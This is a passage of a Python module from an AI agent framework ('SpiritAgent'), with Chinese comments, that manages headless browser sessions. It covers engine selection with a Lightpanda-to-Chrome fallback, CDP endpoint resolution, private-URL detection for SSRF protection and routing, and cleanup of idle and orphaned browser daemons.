#!/usr/bin/env python3
import atexit
import base64
import contextlib
import functools
import glob
import hashlib
import ipaddress
import json
import logging
import math
import os
import re
import shutil
import socket
import subprocess
import sys
import tempfile
import threading
import time
import uuid
from collections.abc import Iterable
from pathlib import Path
from typing import Any
from urllib.parse import unquote, urlparse

import httpx
from utils import (
    CREATE_NO_WINDOW,
    SECRET_PREFIX_RE,
    call_llm_sync,
    cfg_get,
    check_redirect_url_safety,
    check_website_access,
    get_spiritagent_dir,
    get_spiritagent_home,
    is_always_blocked_url,
    is_interrupted,
    is_safe_url,
    is_truthy_value,
    kill_tree,
    load_config,
    normalize_url_for_request,
    pid_exists,
    redact_sensitive_text,
)

from ..multimodal import RESIZE_TARGET_BYTES, is_image_size_error, resize_image_for_vision, resolve_vision_params
from ..process import ProcessRegistry
from ..registry import registry, tool_error
from .browser_camofox import (
    _ensure_tab,
    _post,
    camofox_back,
    camofox_click,
    camofox_close,
    camofox_console,
    camofox_get_images,
    camofox_navigate,
    camofox_press,
    camofox_scroll,
    camofox_snapshot,
    camofox_soft_cleanup,
    camofox_type,
    camofox_vision,
    is_camofox_mode,
)
from .browser_supervisor import _VALID_POLICIES, DEFAULT_DIALOG_POLICY, DEFAULT_DIALOG_TIMEOUT_S, SUPERVISOR_REGISTRY
from .helpers import SNAPSHOT_SUMMARIZE_THRESHOLD, _extract_relevant_content, _truncate_snapshot
from .profile_manager import DEFAULT_RETENTION_HOURS, cleanup_old_profiles, is_profile_locked, resolve_profile_dir

logger = logging.getLogger(__name__)

# 标准 PATH 兜底条目，覆盖 PATH 极简的环境（如 systemd 服务）以及 agent-browser / npx / node 需要的 macOS Homebrew 路径。
_SANE_PATH_DIRS = ("/opt/homebrew/bin", "/opt/homebrew/sbin", "/usr/local/sbin", "/usr/local/bin", "/usr/sbin", "/usr/bin", "/sbin", "/bin")
_SANE_PATH = os.pathsep.join(_SANE_PATH_DIRS)

# import 阶段读配置失败不能让整个 browser toolset 静默消失（discover_builtin_tools 会吞掉异常），非数值类配置回退到默认。
try:
    BROWSER_SESSION_INACTIVITY_TIMEOUT = max(int(cfg_get(load_config(), "browser", "inactivity_timeout_seconds", default=300)), 1)
except (TypeError, ValueError):
    BROWSER_SESSION_INACTIVITY_TIMEOUT = 300


@functools.lru_cache(maxsize=1)
def _discover_homebrew_node_dirs() -> tuple[str, ...]:
    """枚举 macOS Homebrew opt 下的 node@<version> bin 目录（结果按进程缓存）。"""
    homebrew_opt = "/opt/homebrew/opt"
    if not os.path.isdir(homebrew_opt):
        return ()
    try:
        return tuple(
            bin_dir for entry in os.listdir(homebrew_opt) if entry.startswith("node") and entry != "node" and os.path.isdir(bin_dir := os.path.join(homebrew_opt, entry, "bin"))
        )
    except OSError:
        return ()


def _browser_candidate_path_dirs() -> list[str]:
    """返回浏览器 CLI 查找 PATH 的有序候选列表（发现与执行共用）。"""
    spiritagent_home = get_spiritagent_home()
    spiritagent_node_bin = str(spiritagent_home / "node" / "bin")
    spiritagent_node_root = str(spiritagent_home / "node")
    spiritagent_nm_bin = str(spiritagent_home / "node_modules" / ".bin")
    return [spiritagent_node_bin, spiritagent_node_root, spiritagent_nm_bin, *list(_discover_homebrew_node_dirs()), *_SANE_PATH_DIRS]


def _merge_browser_path(existing_path: str = "") -> str:
    """在现有 PATH 之前插入浏览器专用回退目录（保持原顺序）。"""
    path_parts = [p for p in (existing_path or "").split(os.pathsep) if p]
    existing_parts = set(path_parts)
    prefix_parts: list[str] = []

    for part in _browser_candidate_path_dirs():
        if not part or part in existing_parts or part in prefix_parts:
            continue
        if os.path.isdir(part):
            prefix_parts.append(part)

    return os.pathsep.join(prefix_parts + path_parts)


# 节流截图清理，避免每次都全目录扫描。
_LAST_SCREENSHOT_CLEANUP_BY_DIR: dict[str, float] = {}

# 节流下载目录清理（见 _cleanup_old_downloads）。
_LAST_DOWNLOAD_CLEANUP: float = 0.0

# Chromium 发现结果缓存，由 _reset_browser_caches 失效。
_cached_chromium_installed: bool | None = None

# ``browser_find`` 返回的最大匹配数——bounded DOM walk，避免一次把 LLM context 灌满。
_FIND_CAP = 200

# 浏览器命令的默认超时（秒）。
DEFAULT_COMMAND_TIMEOUT = 30

# 合法返回空 stdout 的命令（close / record 等）。
_EMPTY_OK_COMMANDS: frozenset = frozenset({"close", "record"})

_CACHED_COMMAND_TIMEOUT: int | None = None
_COMMAND_TIMEOUT_RESOLVED = False


def _get_command_timeout() -> int:
    """读取 ``config["browser"]["command_timeout"]``，缺失/解析失败时回退到 30s；首次读后缓存，``cleanup_all_browsers`` 时清空。"""
    global _CACHED_COMMAND_TIMEOUT, _COMMAND_TIMEOUT_RESOLVED
    if _COMMAND_TIMEOUT_RESOLVED:
        return _CACHED_COMMAND_TIMEOUT  # type: ignore[return-value]

    _COMMAND_TIMEOUT_RESOLVED = True
    result = DEFAULT_COMMAND_TIMEOUT
    try:
        val = cfg_get(load_config(), "browser", "command_timeout")
        if val is not None:
            result = max(int(val), 5)  # Floor at 5s to avoid instant kills
    except Exception as e:
        logger.debug("Could not read command_timeout from config: %s", e)
    _CACHED_COMMAND_TIMEOUT = result
    return result


def _resolve_cdp_override(cdp_url: str) -> str:
    """把用户给的 CDP 端点规整成可连接的 URL：full ws URL 直通；HTTP/host:port 形式则拉 /json/version 拿 webSocketDebuggerUrl。"""
    raw = (cdp_url or "").strip()
    if not raw:
        return ""

    lowered = raw.lower()
    if "/devtools/browser/" in lowered:
        return raw

    discovery_url = raw
    if lowered.startswith(("ws://", "wss://")):
        if raw.count(":") == 2 and raw.rstrip("/").rsplit(":", 1)[-1].isdigit() and "/" not in raw.split(":", 2)[-1]:
            discovery_url = ("http://" if lowered.startswith("ws://") else "https://") + raw.split("://", 1)[1]
        else:
            return raw

    version_url = discovery_url if discovery_url.lower().endswith("/json/version") else discovery_url.rstrip("/") + "/json/version"

    try:
        response = httpx.get(version_url, timeout=10)
        response.raise_for_status()
        payload = response.json()
    except Exception as exc:
        logger.warning("Failed to resolve CDP endpoint %s via %s: %s", raw, version_url, exc)
        return raw

    ws_url = str(payload.get("webSocketDebuggerUrl") or "").strip()
    if ws_url:
        logger.info("Resolved CDP endpoint %s -> %s", raw, ws_url)
        return ws_url

    logger.warning("CDP discovery at %s did not return webSocketDebuggerUrl; using raw endpoint", version_url)
    return raw


def _get_cdp_override() -> str:
    """返回 ``config["browser"]["cdp_url"]`` 规整后的 CDP URL；无配置返回空串。"""
    try:
        browser_cfg = cfg_get(load_config(), "browser", default={})
        if isinstance(browser_cfg, dict):
            return _resolve_cdp_override(str(browser_cfg.get("cdp_url", "") or ""))
    except Exception as e:
        logger.debug("Could not read browser.cdp_url from config: %s", e)

    return ""


def _get_dialog_policy_config() -> tuple[str, float]:
    """读取 ``browser.dialog_policy`` + ``browser.dialog_timeout_s``；缺失/非法时回退到 supervisor 默认值。"""
    try:
        browser_cfg = cfg_get(load_config(), "browser", default={})
        if not isinstance(browser_cfg, dict):
            return DEFAULT_DIALOG_POLICY, DEFAULT_DIALOG_TIMEOUT_S
        policy = str(browser_cfg.get("dialog_policy") or DEFAULT_DIALOG_POLICY)
        if policy not in _VALID_POLICIES:
            logger.debug("Invalid browser.dialog_policy=%r; using default", policy)
            policy = DEFAULT_DIALOG_POLICY
        timeout_raw = browser_cfg.get("dialog_timeout_s")
        try:
            timeout_s = float(timeout_raw) if timeout_raw is not None else DEFAULT_DIALOG_TIMEOUT_S
            if timeout_s <= 0:
                timeout_s = DEFAULT_DIALOG_TIMEOUT_S
        except (TypeError, ValueError):
            timeout_s = DEFAULT_DIALOG_TIMEOUT_S
        return policy, timeout_s
    except Exception:
        return DEFAULT_DIALOG_POLICY, DEFAULT_DIALOG_TIMEOUT_S


def _ensure_cdp_supervisor(task_id: str) -> None:
    """若存在可达 CDP 端点则给 task_id 启/复用 supervisor；幂等；解析顺序：``browser.cdp_url`` → 当前会话自带的 cdp_url。"""
    cdp_url = _get_cdp_override()
    if not cdp_url:
        # Fallback: the active session may carry a per-session CDP URL set by
        # the CDP-override code path.
        with _cleanup_lock:
            session_info = _active_sessions.get(task_id, {})
        maybe = str(session_info.get("cdp_url") or "")
        if maybe:
            cdp_url = _resolve_cdp_override(maybe)
    if not cdp_url:
        return
    try:
        policy, timeout_s = _get_dialog_policy_config()
        SUPERVISOR_REGISTRY.get_or_start(task_id=task_id, cdp_url=cdp_url, dialog_policy=policy, dialog_timeout_s=timeout_s)
    except Exception as exc:
        logger.debug("CDP supervisor attach for task=%s failed (non-fatal): %s", task_id, exc)


def _stop_cdp_supervisor(task_id: str) -> None:
    """停掉 task_id 对应的 CDP supervisor（不存在则 no-op）。"""
    try:
        SUPERVISOR_REGISTRY.stop(task_id)
    except Exception as exc:
        logger.debug("CDP supervisor stop for task=%s failed (non-fatal): %s", task_id, exc)


_cached_agent_browser: str | None = None
_agent_browser_resolved = False

# Lightpanda 引擎支持：agent-browser >=0.25.3 原生支持 ``--engine lightpanda``，从 ``config["browser"]["engine"]`` 读。
_cached_browser_engine: str | None = None
_browser_engine_resolved = False

_VALID_BROWSER_ENGINES = ("auto", "lightpanda", "chrome")


def _browser_install_hint() -> str:
    return "npm install -g agent-browser && agent-browser install --with-deps"


def _get_browser_engine() -> str:
    """读取 ``config["browser"]["engine"]`` 并缓存；非 auto/lightpanda/chrome 一律回退到 auto（即不传 --engine）。"""
    global _cached_browser_engine, _browser_engine_resolved
    if _browser_engine_resolved:
        return _cached_browser_engine

    _browser_engine_resolved = True
    _cached_browser_engine = "auto"
    val = cfg_get(load_config(), "browser", "engine")
    if isinstance(val, str) and val.strip():
        candidate = val.strip().lower()
        if candidate in _VALID_BROWSER_ENGINES:
            _cached_browser_engine = candidate
        else:
            logger.warning("Unknown browser engine %r (valid: %s), falling back to 'auto'", candidate, ", ".join(_VALID_BROWSER_ENGINES))

    return _cached_browser_engine


def _should_inject_engine(engine: str) -> bool:
    """只在非 auto、本地非 Camofox 会话里给 agent-browser 加 --engine 参数。"""
    if engine == "auto":
        return False
    return not is_camofox_mode()


def _using_lightpanda_engine() -> bool:
    """本地浏览器命令当前是否使用 Lightpanda 引擎。"""
    return _get_browser_engine() == "lightpanda"


def _lightpanda_fallback_reason(engine: str, command: str, result: dict[str, Any]) -> str | None:
    """若 Lightpanda 结果需要 Chrome 回退则返回用户可见原因；``None`` 表示无需回退。"""
    if engine != "lightpanda":
        return None

    # 会话管理命令（close / record）绑定在引擎守护进程上，不能换引擎重试。
    _FALLBACK_ELIGIBLE = {"open", "snapshot", "screenshot", "eval", "click", "fill", "scroll", "back", "press", "console", "errors"}
    if command not in _FALLBACK_ELIGIBLE:
        return None

    if not result.get("success"):
        error = str(result.get("error") or "command failed").strip()
        return f"Lightpanda {command!r} failed ({error}); retried with Chrome."

    data = result.get("data", {})

    if command == "snapshot":
        snap = data.get("snapshot", "")
        # Empty or near-empty snapshots indicate Lightpanda couldn't render
        if not snap or len(snap.strip()) < 20:
            return "Lightpanda returned an empty/too-short snapshot; retried with Chrome."

    if command == "screenshot":
        # Lightpanda returns a placeholder PNG with its panda logo.
        # Since LP PR #1766 resized it to 1920x1080, the placeholder is
        # ~17 KB.  Real Chromium screenshots are typically 100 KB+.
        path = data.get("path", "")
        if path:
            try:
                size = os.path.getsize(path)
                if size < 20480:
                    logger.debug("Lightpanda screenshot is suspiciously small (%d bytes), triggering Chrome fallback", size)
                    return f"Lightpanda screenshot was suspiciously small ({size} bytes); retried with Chrome."
            except OSError:
                return "Lightpanda screenshot file was missing/unreadable; retried with Chrome."

    return None


def _annotate_lightpanda_fallback(result: dict[str, Any], reason: str) -> dict[str, Any]:
    """为浏览器命令结果加上 Lightpanda→Chrome 回退的用户可见提示（顶层 + data 内同步）。"""
    warning = f"⚠ Lightpanda fallback: Chrome was used for this browser action. {reason}"
    annotated = dict(result)
    annotated["fallback_warning"] = warning
    annotated["browser_engine"] = "chrome"
    annotated["browser_engine_fallback"] = {"from": "lightpanda", "to": "chrome", "reason": reason}
    data = annotated.get("data")
    if isinstance(data, dict):
        data = dict(data)
        data.setdefault("fallback_warning", warning)
        data.setdefault("browser_engine", "chrome")
        data.setdefault("browser_engine_fallback", {"from": "lightpanda", "to": "chrome", "reason": reason})
        annotated["data"] = data
    return annotated


def _copy_fallback_warning(target: dict[str, Any], result: dict[str, Any]) -> dict[str, Any]:
    """把内部结果里的浏览器引擎回退元数据复制到工具响应。"""
    if result.get("fallback_warning"):
        target["fallback_warning"] = result["fallback_warning"]
        target["browser_engine"] = result.get("browser_engine")
        target["browser_engine_fallback"] = result.get("browser_engine_fallback")
    return target


def _run_chrome_fallback_command(task_id: str, command: str, args: list[str], timeout: int) -> dict[str, Any]:
    """在临时 Chrome 会话里跑一次浏览器命令（绕过 Lightpanda daemon 已锁定的引擎）；先取 LP 当前 URL，再创建临时 Chrome 并跳过去。"""

    # 1. 先从 Lightpanda session 拿到当前 URL；用 ``_engine_override="auto"`` 避免在 eval 失败时又触发 LP→Chrome 回退。
    url_result = _run_browser_command(task_id, "eval", ["window.location.href"], timeout=10, _engine_override="auto")
    current_url = None
    if url_result.get("success"):
        current_url = url_result.get("data", {}).get("result", "").strip().strip('"').strip("'")
    if not current_url:
        logger.warning("Chrome fallback: could not determine current URL from LP session")
        return {"success": False, "error": "Chrome fallback failed: could not determine current URL"}

    # 2. 新建临时 Chrome session（绕开 _get_session_info 缓存）。
    tmp_session = f"h_cfb_{uuid.uuid4().hex[:8]}"
    try:
        browser_cmd = _find_agent_browser()
    except FileNotFoundError as e:
        return {"success": False, "error": str(e)}

    if not _chromium_installed():
        hint = "Chrome fallback requires Chromium, but it is missing. Install it with: npx agent-browser install --with-deps (or: npx playwright install --with-deps chromium)"
        return {"success": False, "error": hint}

    # Windows 上 npx 是 npx.cmd，用 shutil.which 以便 CreateProcessW 能跑 .cmd shim；shutil.which 在 Windows 上遵循 PATHEXT，在 POSIX 上返回纯可执行文件。若 npx 不在 PATH（裸容器），回退到裸名让 Popen 抛出可读的 "FileNotFoundError: 'npx'"，而不是 WinError 193。
    if browser_cmd == "npx agent-browser":
        _npx_bin = shutil.which("npx") or "npx"
        cmd_prefix = [_npx_bin, "agent-browser"]
    else:
        cmd_prefix = [browser_cmd]
    base_args = [*cmd_prefix, "--engine", "chrome", "--session", tmp_session, "--json"]

    task_socket_dir = os.path.join(_socket_safe_tmpdir(), f"agent-browser-{tmp_session}")
    os.makedirs(task_socket_dir, mode=0o700, exist_ok=True)
    browser_env = {**os.environ, "AGENT_BROWSER_SOCKET_DIR": task_socket_dir}
    browser_env["PATH"] = _merge_browser_path(browser_env.get("PATH", ""))

    if "AGENT_BROWSER_IDLE_TIMEOUT_MS" not in browser_env:
        browser_env["AGENT_BROWSER_IDLE_TIMEOUT_MS"] = str(BROWSER_SESSION_INACTIVITY_TIMEOUT * 1000)

    def _run_tmp(cmd: str, cmd_args: list[str]) -> dict[str, Any]:
        full = [*base_args, cmd, *cmd_args]
        # Use temp-file stdout/stderr pattern (same as _run_browser_command)
        # to avoid pipe hang from agent-browser daemon inheriting fds.
        stdout_path = os.path.join(task_socket_dir, f"_stdout_{cmd}")
        stderr_path = os.path.join(task_socket_dir, f"_stderr_{cmd}")
        stdout_fd = os.open(stdout_path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
        stderr_fd = os.open(stderr_path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
        try:
            # On Windows, launch the child in a new process group so parent
            # console Ctrl+C doesn't kill it with STATUS_CONTROL_C_EXIT
            # (0xC000013A = rc 3221225786), AND insulate its stdio + handle
            # inheritance from the parent.
            #
            # Additional Windows hardening beyond CREATE_NEW_PROCESS_GROUP:
            # * STARTF_USESTDHANDLES + explicit handles → CreateProcess hands
            #   the child ONLY our three chosen handles (DEVNULL stdin +
            #   temp-file stdout/stderr). Without this, some parents leak
            #   console handles that break downstream grandchild spawns — the
            #   agent-browser Rust binary spawns a detached daemon grandchild,
            #   and that grandchild's CreateProcess dies silently with the error
            #   'Daemon process exited during startup with no error output'
            #   when inherited parent handles are in a weird state. Observed
            #   in the SpiritAgent CLI where sys.stdout and sys.stderr both report
            #   fileno=1 (stderr dup'd onto stdout at the OS level).
            # * close_fds=True → block inheritance of every other handle.
            #   (Default on POSIX; must be explicit on Windows for stdio.)
            _popen_extra: dict = {}
            if os.name == "nt":
                # CREATE_NO_WINDOW → don't attach a console (cmd.exe would
                # otherwise briefly allocate one for the .cmd shim).
                # Do NOT add CREATE_NEW_PROCESS_GROUP: on Python 3.11 Windows
                # it interacts with asyncio's ProactorEventLoop such that the
                # subprocess creation cancels the running loop task, which
                # surfaces as KeyboardInterrupt in app.run() and tears down
                # the CLI mid-turn. The agent thread's subprocess spawn
                # unwound MainThread's prompt_toolkit loop that way — see
                # diag log: "asyncio.CancelledError → KeyboardInterrupt".
                _popen_extra["creationflags"] = CREATE_NO_WINDOW
                _popen_extra["close_fds"] = True
                _si = subprocess.STARTUPINFO()
                _si.dwFlags |= subprocess.STARTF_USESTDHANDLES
                _popen_extra["startupinfo"] = _si
            proc = subprocess.Popen(full, stdout=stdout_fd, stderr=stderr_fd, stdin=subprocess.DEVNULL, env=browser_env, **_popen_extra)
        finally:
            os.close(stdout_fd)
            os.close(stderr_fd)
        try:
            proc.wait(timeout=timeout)
        except subprocess.TimeoutExpired:
            if not kill_tree(proc.pid, force=True):
                proc.kill()
            proc.wait()
            return {"success": False, "error": f"Chrome fallback '{cmd}' timed out"}
        try:
            with open(stdout_path, encoding="utf-8") as f:
                stdout = f.read().strip()
            if stdout:
                return json.loads(stdout.split("\n")[-1])
        except Exception as exc:
            logger.debug("Chrome fallback tmp cmd '%s' error: %s", cmd, exc)
        finally:
            for pth in (stdout_path, stderr_path):
                with contextlib.suppress(OSError):
                    os.unlink(pth)
        return {"success": False, "error": f"Chrome fallback '{cmd}' failed"}

    try:
        # 3. 让 Chrome 跳到同一 URL。
        nav = _run_tmp("open", [current_url])
        if not nav.get("success"):
            logger.warning("Chrome fallback: navigate failed: %s", nav.get("error"))
            return {"success": False, "error": f"Chrome fallback navigate failed: {nav.get('error')}"}

        # 4. 在 Chrome 里跑目标命令。
        return _run_tmp(command, args)

    finally:
        # 5. 关掉临时 Chrome session。
        with contextlib.suppress(Exception):
            _run_tmp("close", [])

        shutil.rmtree(task_socket_dir, ignore_errors=True)


def _chrome_fallback_screenshot(task_id: str, args: list[str], timeout: int) -> dict[str, Any]:
    """通过临时 Chrome 会话截图（用于 Lightpanda 截图回退）。"""
    return _run_chrome_fallback_command(task_id, "screenshot", args, timeout)


def _url_is_private(url: str) -> bool:
    """URL 主机解析到私有/LAN/loopback 地址时返回 True（DNS 失败视为非私有，让上层暴露真实错误）。"""
    try:
        # is_safe_url returns False for private/loopback/link-local/CGNAT AND
        # for DNS failures.  We only want the private-network case here, so
        # we parse + check the host shape as a DNS-failure sieve first.

        parsed = urlparse(url)
        hostname = (parsed.hostname or "").strip().lower().rstrip(".")
        if not hostname:
            return False
        # Literal IP → check directly
        try:
            ip = ipaddress.ip_address(hostname)
            return (
                ip.is_private
                or ip.is_loopback
                or ip.is_link_local
                # 172.16.0.0/12: only covered by ip.is_private on Python
                # ≥3.11 (bpo-40791).  Explicit check keeps 3.10 runtimes
                # routing these to the local sidecar correctly.
                or ip in ipaddress.ip_network("172.16.0.0/12")
                or ip in ipaddress.ip_network("100.64.0.0/10")
            )
        except ValueError:
            pass
        # Hostname — must resolve to confirm it's private (bare "localhost"
        # resolves to 127.0.0.1 via /etc/hosts).  Short-circuit on obvious
        # names to avoid a DNS hop.
        if hostname in {"localhost"} or hostname.endswith(".localhost"):
            return True
        if hostname.endswith(".local") or hostname.endswith(".lan") or hostname.endswith(".internal"):
            return True
        try:
            addr_info = socket.getaddrinfo(hostname, None, socket.AF_UNSPEC, socket.SOCK_STREAM)
        except socket.gaierror:
            return False  # DNS fail → not private, let the normal path fail
        for _, _, _, _, sockaddr in addr_info:
            try:
                ip = ipaddress.ip_address(sockaddr[0])
            except ValueError:
                continue
            if ip.is_private or ip.is_loopback or ip.is_link_local or ip in ipaddress.ip_network("100.64.0.0/10"):
                return True
        return False
    except Exception as exc:
        logger.debug("URL-privacy check failed for %s: %s", url, exc)
        return False


def _navigation_session_key(task_id: str, url: str) -> str:
    """为 task_id + url 选 session key：私有/LAN/loopback URL 走带 ``::local`` 后缀的本地 sidecar key，否则用裸 task_id。"""
    if task_id is None:
        task_id = "default"
    if _get_cdp_override():
        return task_id
    if is_camofox_mode():
        return task_id
    if not _url_is_private(url):
        return task_id
    return f"{task_id}{_LOCAL_SUFFIX}"


def _is_local_sidecar_key(session_key: str) -> bool:
    """``session_key`` 为混合路由的本地 sidecar 时返回 True。"""
    return session_key.endswith(_LOCAL_SUFFIX)


def _last_session_key(task_id: str) -> str:
    """返回非 nav 工具调用的 session key：优先用上一次 browser_navigate 选中的 key，否则回退到裸 task_id。"""
    if task_id is None:
        task_id = "default"
    return _last_active_session_key.get(task_id, task_id)


@functools.lru_cache(maxsize=1)
def _allow_private_urls() -> bool:
    """读取 ``config["browser"]["allow_private_urls"]``（默认 False，启用 SSRF 保护），结果按进程缓存。"""
    try:
        val = cfg_get(load_config(), "browser", "allow_private_urls")
        return is_truthy_value(val, default=False)
    except Exception as e:
        logger.debug("Could not read allow_private_urls from config: %s", e)
        return False


def _socket_safe_tmpdir() -> str:
    """返回适合 AF_UNIX 的临时目录：macOS 上 ``TMPDIR`` 太长会撞上 104 字节路径上限，所以直接用 ``/tmp``。"""
    if sys.platform == "darwin":
        return "/tmp"
    return tempfile.gettempdir()


# 按 "session key" 跟踪活动会话。
#
# "session key" 是裸 task_id（默认）或 ``f"{task_id}::local"``（混合路由为 LAN/localhost URL spawn 的本地 sidecar）——两种形式都走同一套 _active_sessions / _run_browser_command / cleanup_browser 路径，key 对它们不透明。
#
# 存储字段：session_name（必有）、cdp_url（仅 CDP override）。
_active_sessions: dict[str, dict[str, str]] = {}  # session_key -> {session_name, ...}
_recording_sessions: set = set()  # session_keys with active recordings

# 记录每个 task_id 最近一次使用的 session_key：browser_navigate 选定后端时写入，每次非 nav 工具调用（snapshot/click/fill/eval...）读它以路由到上一次导航的会话。没有这个的话，访问 localhost 走本地 sidecar 后下次 snapshot 会回退到 cloud session。
_last_active_session_key: dict[str, str] = {}  # task_id -> session_key
_LOCAL_SUFFIX = "::local"

_cleanup_done = False

_session_last_activity: dict[str, float] = {}

_cleanup_thread = None
_cleanup_running = False

# (subagent 通过 ThreadPoolExecutor 并发跑)
_cleanup_lock = threading.Lock()


def _emergency_cleanup_all_sessions() -> None:
    """进程退出/中断时的兜底清理：先收本进程会话，再 sweep 其他崩溃 spiritagent 留下的孤儿守护进程。"""
    global _cleanup_done
    if _cleanup_done:
        return
    _cleanup_done = True

    # 先收本进程自己的会话，确保 owner_pid 文件在 reaper 扫描前被删除。
    if _active_sessions:
        logger.info("Emergency cleanup: closing %s active session(s)...", len(_active_sessions))
        try:
            cleanup_all_browsers()
        except Exception as e:
            logger.error("Emergency cleanup error: %s", e)
        finally:
            with _cleanup_lock:
                _active_sessions.clear()
                _session_last_activity.clear()
                _recording_sessions.clear()

    # sweep 其他崩溃 spiritagent 进程留下的孤儿守护进程：通过 owner_pid 活性判断，避免误伤其他 live 进程拥有的守护进程。
    try:
        _reap_orphaned_browser_sessions()
    except Exception as e:
        logger.debug("Orphan reap on exit failed: %s", e)


# 不直接挂 SIGINT/SIGTERM handler 来清理：在 key-binding callback 内 raise SystemExit 会破坏 prompt_toolkit 的异步循环，导致进程无法被杀掉；atexit 在任何正常退出（含 sys.exit）都会跑，所以仍能保证浏览器会话被清理。
atexit.register(_emergency_cleanup_all_sessions)


def _cleanup_inactive_browser_sessions() -> None:
    """关闭空闲超过 BROWSER_SESSION_INACTIVITY_TIMEOUT 的浏览器会话，由后台清理线程周期性调用。"""
    current_time = time.time()
    sessions_to_cleanup = []

    with _cleanup_lock:
        for task_id, last_time in list(_session_last_activity.items()):
            if current_time - last_time > BROWSER_SESSION_INACTIVITY_TIMEOUT:
                sessions_to_cleanup.append(task_id)

    for task_id in sessions_to_cleanup:
        try:
            elapsed = int(current_time - _session_last_activity.get(task_id, current_time))
            logger.info("Cleaning up inactive session for task: %s (inactive for %ss)", task_id, elapsed)
            cleanup_browser(task_id)
            with _cleanup_lock:
                _session_last_activity.pop(task_id, None)
        except Exception as e:
            logger.warning("Error cleaning up inactive session %s: %s", task_id, e)


def _write_owner_pid(socket_dir: str, session_name: str) -> None:
    """把当前 spiritagent PID 写入 ``<socket_dir>/<session_name>.owner_pid``，供跨进程的孤儿守护进程回收判别。"""
    try:
        path = os.path.join(socket_dir, f"{session_name}.owner_pid")
        with open(path, "w", encoding="utf-8") as f:
            f.write(str(os.getpid()))
    except OSError as exc:
        logger.debug("Could not write owner_pid file for %s: %s", session_name, exc)


def _reap_orphaned_browser_sessions() -> None:
    """扫描上次崩溃留下的 agent-browser 守护进程：通过 ``owner_pid`` 文件跨进程识别 owner 是否还活着，死的就回收。"""
    tmpdir = _socket_safe_tmpdir()
    pattern = os.path.join(tmpdir, "agent-browser-h_*")
    socket_dirs = glob.glob(pattern)

    socket_dirs += glob.glob(os.path.join(tmpdir, "agent-browser-cdp_*"))
    # 同时收 Camofox 会话（user_id 形如 ``spiritagent_<uuid>``，见 browser_camofox.py；这些 socket dir 不归它管但顺带清掉避免临时文件堆积）。
    socket_dirs += glob.glob(os.path.join(tmpdir, "agent-browser-spiritagent_*"))

    if not socket_dirs:
        return

    with _cleanup_lock:
        tracked_names = {info.get("session_name") for info in _active_sessions.values() if info.get("session_name")}

    reaped = 0
    for socket_dir in socket_dirs:
        dir_name = os.path.basename(socket_dir)
        # Extract session name from dir_name which has format 'agent-browser-{session_name}'
        session_name = dir_name.removeprefix("agent-browser-")
        if not session_name:
            continue

        # Ownership check: prefer owner_pid file (cross-process safe).
        owner_pid_file = os.path.join(socket_dir, f"{session_name}.owner_pid")
        owner_alive: bool | None = None  # None = owner_pid missing/unreadable
        if os.path.isfile(owner_pid_file):
            try:
                owner_pid = int(Path(owner_pid_file).read_text(encoding="utf-8").strip())
                # ``os.kill(pid, 0)`` is NOT a no-op on Windows (bpo-14484).
                # Use the cross-platform existence check.

                owner_alive = pid_exists(owner_pid)
            except (ValueError, OSError):
                owner_alive = None  # corrupt file — fall through

        if owner_alive is True:
            # Owner is alive — this session belongs to a live spiritagent process.
            continue

        # No owner_pid file (legacy daemon).  Fall back to in-process
        # tracking: if this process knows about the session, leave alone.
        if owner_alive is None and session_name in tracked_names:
            continue

        # owner_alive is False (dead owner) OR legacy daemon not tracked here.
        pid_file = os.path.join(socket_dir, f"{session_name}.pid")
        if not os.path.isfile(pid_file):
            # No daemon PID file — just a stale dir, remove it
            shutil.rmtree(socket_dir, ignore_errors=True)
            continue

        try:
            daemon_pid = int(Path(pid_file).read_text(encoding="utf-8").strip())
        except (ValueError, OSError):
            shutil.rmtree(socket_dir, ignore_errors=True)
            continue

        # Check if the daemon is still alive. ``os.kill(pid, 0)`` on Windows
        # is NOT a no-op — use the handle-based existence check.

        if not pid_exists(daemon_pid):
            shutil.rmtree(socket_dir, ignore_errors=True)
            continue

        # Daemon is alive and its owner is dead (or legacy + untracked).  Reap.
        # Use the process-tree termination helper so Chromium children
        # (renderer, GPU, etc.) are cleaned up, not just the daemon parent.
        try:
            ProcessRegistry._terminate_host_pid(daemon_pid)
            logger.info("Reaped orphaned browser daemon PID %d (session %s)", daemon_pid, session_name)
            reaped += 1
        except (ProcessLookupError, PermissionError, OSError):
            pass

        shutil.rmtree(socket_dir, ignore_errors=True)

    if reaped:
        logger.info("Reaped %d orphaned browser session(s) from previous run(s)", reaped)


def _browser_cleanup_thread_worker() -> None:
    """每 30 秒检查并清理空闲浏览器会话的后台线程；启动时还会先回收一次孤儿守护进程。"""
    # 启动时一次性回收孤儿守护进程。
    try:
        _reap_orphaned_browser_sessions()
    except Exception as e:
        logger.warning("Orphan reap error: %s", e)

    while _cleanup_running:
        try:
            _cleanup_inactive_browser_sessions()
        except Exception as e:
            logger.warning("Cleanup thread error: %s", e)
        try:
            cleanup_old_profiles(retention_hours=DEFAULT_RETENTION_HOURS)
        except Exception as e:
            logger.warning("Profile cleanup error: %s", e)

        # Sleep in 1-second intervals so we can stop quickly if needed
        for _ in range(30):
            if not _cleanup_running:
                break
            time.sleep(1)


def _start_browser_cleanup_thread() -> None:
    """若空闲清理后台线程未启动则启动它。"""
    global _cleanup_thread, _cleanup_running

    with _cleanup_lock:
        if _cleanup_thread is None or not _cleanup_thread.is_alive():
            _cleanup_running = True
            _cleanup_thread = threading.Thread(target=_browser_cleanup_thread_worker, daemon=True, name="browser-cleanup")
            _cleanup_thread.start()
            logger.info("Started inactivity cleanup thread (timeout: %ss)", BROWSER_SESSION_INACTIVITY_TIMEOUT)


def _stop_browser_cleanup_thread() -> None:
    """停止空闲清理后台线程。"""
    global _cleanup_running
    _cleanup_running = False
    if _cleanup_thread is not None:
        _cleanup_thread.join(timeout=5)


def _update_session_activity(task_id: str) -> None:
    """更新 task_id 对应会话的最后活动时间戳，供空闲清理判定。"""
    with _cleanup_lock:
        _session_last_activity[task_id] = time.time()


atexit.register(_stop_browser_cleanup_thread)

BROWSER_TOOL_SCHEMAS = [
    {
        "name": "browser_navigate",
